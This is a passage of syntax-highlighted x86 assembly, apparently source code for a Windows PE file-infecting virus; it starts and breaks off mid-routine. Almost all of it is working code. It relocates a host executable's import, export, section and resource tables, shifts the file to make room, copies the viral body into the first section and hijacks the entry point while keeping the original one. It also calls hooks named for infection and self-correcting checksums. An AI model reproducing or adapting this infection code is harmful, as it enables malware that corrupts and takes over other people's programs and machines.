                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__fix0r</span><span class="sc0">
</span><span class="sc5">__imp1_fixtbl_v2</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__fix0r</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__imp_cycle</span><span class="sc0">

</span><span class="sc5">__fix0r</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">__imp1_cycle</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__imp1_exit</span><span class="sc0">
                        </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">     </span><span class="sc1">; ordinal?</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__skipfixit</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__skipfixit</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__imp1_cycle</span><span class="sc0">
</span><span class="sc5">__imp1_exit</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">__imp_exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">__skipfiximp</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; fix export table</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_exporttablerva</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__skipfixexp</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.ex_namerva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.ex_addresstablerva</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.ex_numoffunctions</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__fixexp1x</span><span class="sc0">
</span><span class="sc5">__fixexp1</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__skipexp1</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__skipexp1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__fixexp1</span><span class="sc0">
</span><span class="sc5">__fixexp1x</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.ex_namepointersrva</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.ex_numofnamepointers</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__fixexp2x</span><span class="sc0">
</span><span class="sc5">__fixexp2</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__skipexp2</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__skipexp2</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__fixexp2</span><span class="sc0">
</span><span class="sc5">__fixexp2x</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.ex_addresstablerva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.ex_namepointersrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.ex_ordinaltablerva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__skipfixexp</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; fix object table</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_objtableptr</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_numofobjects</span><span class="sc0"> </span><span class="sc1">; ecx = objcount</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.oe_virt_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__obj_cycle</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__obj_end</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.oe_phys_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.oe_virt_rva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__obj_cycle</span><span class="sc0">
</span><span class="sc5">__obj_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; fix entrypointrva</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_entrypointrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; fix other PE header entries</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_sizeofcode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_imagesize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_baseofdatarva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_stackreservesize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INC_STACK</span><span class="sc0">

</span><span class="sc1">; fix PE rvas</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_rvasizes</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_numofrvaandsizes</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">

</span><span class="sc5">__rva_cycle</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__rva_skip</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__rva_skip</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__rva_cycle</span><span class="sc0">

</span><span class="sc1">; move 2nd part of file forward</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_objtableptr</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.oe_phys_offs</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

                        </span><span class="sc6">std</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc1">; copy our code into file</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_objtableptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.oe_phys_offs</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_fileptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_start</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc1">; set our entrypoint</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_objtableptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.oe_virt_rva</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_entry</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_entrypointrva</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_old_eip</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc1">; set popa.EAX = new file size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_size</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.popa_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_fileptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_objtableptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.oe_virt_rva</span><span class="sc0">
                        </span><span class="sc5">eventX</span><span class="sc0">  </span><span class="sc5">EV_INFECT1_HOOK</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc1">; selfcorr - do csum</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_objtableptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.oe_phys_offs</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_fileptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_orig_size</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EDI=csum data</span><span class="sc0">
                        </span><span class="sc5">eventX</span><span class="sc0">  </span><span class="sc5">EV_SELFCORR_CSUM_CREATE</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc1">; return success (CF=0)</span><span class="sc0">
                        </span><span class="sc6">clc</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__quit</span><span class="sc0">

</span><span class="sc1">; return error (CF=1)</span><span class="sc0">
</span><span class="sc5">__error</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">stc</span><span class="sc0">

</span><span class="sc5">__quit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__virt2phys</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_numofobjects</span><span class="sc0"> </span><span class="sc1">; ecx = objcount</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_objtableptr</span><span class="sc0">

</span><span class="sc5">__v2p_cycle</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.oe_virt_rva</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__v2p_cont</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__v2p_cont</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.oe_phys_offs</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">clc</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__v2p_exit</span><span class="sc0">

</span><span class="sc5">__v2p_cont</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__v2p_cycle</span><span class="sc0">

                        </span><span class="sc6">stc</span><span class="sc0">

</span><span class="sc5">__v2p_exit</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_fileptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; input: EDX = rsrc offset</span><span class="sc0">

</span><span class="sc5">__fix_rsrc</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">__rsrc_cycle</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__rsrc_end</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">
                        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">__x_data</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_resourcebase</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__fix_rsrc</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__x_both</span><span class="sc0">
</span><span class="sc5">__x_data</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_resourcebase</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
